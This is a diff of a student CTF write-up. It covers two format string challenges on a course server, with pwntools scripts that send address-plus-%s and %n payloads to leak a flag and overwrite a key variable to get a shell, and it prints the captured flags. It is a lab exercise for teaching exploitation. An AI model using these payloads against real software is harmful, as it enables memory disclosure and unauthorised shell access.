@@ -15,8 +15,8 @@ This program has **Partial RELRO**, meaning that there is no risk of a buffer ov
 After some time exploring the source code, we found some important information about this executable:
 
 ```
-- In the line 27, a user input is printed.
-- We can read the value of the global variable using printf().
+- In the line 27, a user input is printed and the user has control over the first argument of printf.
+- Giving the control of the first argument of printf to the user has memory leaks vulnerabilities, such as read or changing the value of variables.
 - The address of flag is 0x0804c060
 ```
 
@@ -26,22 +26,7 @@ We used the printf function to make a format string attack. The following python
 #!/usr/bin/python3
 from pwn import *
 
-LOCAL = False
-
-if LOCAL:
-    p = process("./program")
-    """
-    O pause() para este script e permite-te usar o gdb para dar attach ao processo
-    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
-    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
-    Depois correr o gdb de forma a dar attach. 
-    (Exemplo: `$ gdb attach 9717` )
-    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
-    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
-    """
-    pause()
-else:    
-    p = remote("ctf-fsi.fe.up.pt", 4004)
+p = remote("ctf-fsi.fe.up.pt", 4004)
 
 p.recvuntil(b"got:")
 p.sendline(b"\x60\xc0\x04\x08"+b"%s")
@@ -56,10 +41,32 @@ flag{3a0f46cdeaa85626428c12879b84703f}
 
 ### Desafio 2
 
-This challenge had some differences when comparing to the first one:
+This challenge is very similar to the first one in the way that the user controls the printf call but it has some key differences:
 
 ```
-- In the line 14, a user input is printed and we can modify the value in memory.
-- The system call is used to retrieve the flag.
-- We have to alter the key value, mapped in 0x0804c034, to 0xbeef.
+- Instead of only reading the value of the global variable, we have to change it to 0xbeef in order to open up a bash
+- The bash is used to get the flag with: cat flag.txt
+- The address of the key value is 0x0804c034.
+```
+
+Similarly to the first one, we needed to use a format string attack but with some changes. Instead of reading the value, we needed to write an integer value to match 0xbeef. 0xbeef is 48879 in decimal, and this is the value that the `key` variable must have. 
+
+In printf(), `%n` is a special format specifier which instead of printing something causes printf() to load the variable pointed by the corresponding argument with a value equal to the number of characters that have been printed by printf() before the occurrence of `%n`. We could use this feature to store the wanted value in the `key` variable. Using the following code we are able to achieve that:
+
+```py
+#!/usr/bin/python3
+from pwn import *
+
+p = remote("ctf-fsi.fe.up.pt", 4005)
+
+p.recvuntil(b"here...")
+p.sendline(b"\x34\xc0\x04\x08" + b"%48875x%1$n")
+p.interactive()
+```
+
+This translates to writing the address of the `key` variable in the stack, in little endian format. After that, as we already written 4 bytes, we only need 48875 more to make 0xbeef, so we read them from the program and store them in the `key` variable. After that, the comparison turns true and we get the shell.
+
+Flag:
+```
+flag{91b434959469afb533a5516651d74c98}
 ```
